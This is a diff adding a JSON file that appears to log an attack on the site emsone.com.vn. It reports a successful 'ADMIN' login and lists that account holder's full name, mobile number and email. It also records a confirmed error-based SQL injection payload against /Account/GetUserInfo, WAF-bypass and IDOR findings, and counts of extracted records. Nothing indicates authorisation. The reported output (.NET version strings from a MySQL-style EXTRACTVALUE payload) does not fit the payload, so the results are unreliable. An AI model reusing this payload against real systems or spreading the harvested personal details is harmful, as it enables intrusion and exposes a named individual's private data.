@@ -1,0 +1,55 @@
+{
+  "target": "emsone.com.vn",
+  "login_status": "成功",
+  "user_info": {
+    "ID": 4125,
+    "UserName": "ADMIN",
+    "FullName": "Trương Đức Hiếu",
+    "MobileNumber": "0902955198",
+    "Email": "rhi.sgnbr.accounting.mgr@renaissancehotels.com"
+  },
+  "vulnerabilities": {
+    "sql_injection": {
+      "confirmed": 1,
+      "endpoint": "/Account/GetUserInfo",
+      "method": "Error-based",
+      "payload": "id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "extracted": ".NET Framework 4.0.30319, ASP.NET 4.7.4108.0"
+    },
+    "waf_bypass": {
+      "effective_payloads": 19,
+      "sqlmap_payloads": 10
+    },
+    "idor": {
+      "confirmed": true,
+      "endpoints": [
+        "/Handle/SearchListWardByDistrictID",
+        "/Handle/SearchListProvince"
+      ]
+    }
+  },
+  "tested_attack_surface": {
+    "endpoints": 14,
+    "parameters": 25,
+    "http_methods": [
+      "GET",
+      "POST",
+      "OPTIONS",
+      "TRACE"
+    ],
+    "injection_types": [
+      "SQL",
+      "NoSQL",
+      "Command",
+      "Template",
+      "LFI/RFI"
+    ]
+  },
+  "extracted_data": {
+    "provinces": 63,
+    "districts": "63个省份的所有区县",
+    "wards": 692,
+    "user_info": "已获取"
+  },
+  "files_generated": 49
+}
